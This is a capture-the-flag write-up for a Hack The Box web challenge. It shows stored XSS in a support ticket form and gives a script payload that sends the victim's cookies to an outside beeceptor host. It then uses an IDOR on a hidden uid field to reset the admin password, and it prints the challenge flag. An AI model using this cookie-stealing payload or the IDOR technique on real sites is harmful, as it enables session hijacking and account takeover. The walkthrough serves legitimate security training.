# Web 1: Kryptos Support
> The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?


#### Difficulty: ★☆☆☆

No downloadable elements for this one, so I spun up the Docker image and accessed the site. Using View Source I was able to see the javascript file `support.js` which contains the ticket creation code.
Clicking the BACKEND link on the top left leads us to a login screen, with username and password fields. Upon checking the `login.js` from this page, looks like the login process just redirects via `window.location.href` which probably means that there are cookies involved.

Going back to the ticket submission screen, it doesn't seem like there are any protections for **XSS**, so I let loose the usual XSS payloads to hopefully steal some cookies. I created a beeceptor hook for this testing and used the following payload:

`<script> var i = new Image(); i.src = "https://hansoo.free.beeceptor.com/?cookie=" + escape(document.cookie); </script>`

I was able to get the session cookie from my beeceptor hook, which I added using Chrome's devtools. With this cookie, I was able to see the tickets that have been submitted. I tried editing the JWT, noticing that it has fields for username (moderator) and uid (100), but my attempts were not fruitful.

I clicked the Settings link on the top left, which brought me to a password update screen. With dev tools open, I changed the password for moderator and checked the payload.
`{password: "password123", uid: "100"}`

The payload contains a uid, so I searched the page to see where this uid is being set. Turns out there is a hidden field that sets the uid to 100. There is nothing stopping me from just changing this to a different uid, which means that the password change screen is vulnerable to **Insecure direct object references (IDOR)** attacks so I changed it to 1 and used the same password.

`Password for admin changed successfully!`

I then logged in as admin using the password I set, which rewarded me with the flag.

`HTB{x55_4nd_id0rs_ar3_fun!!}`
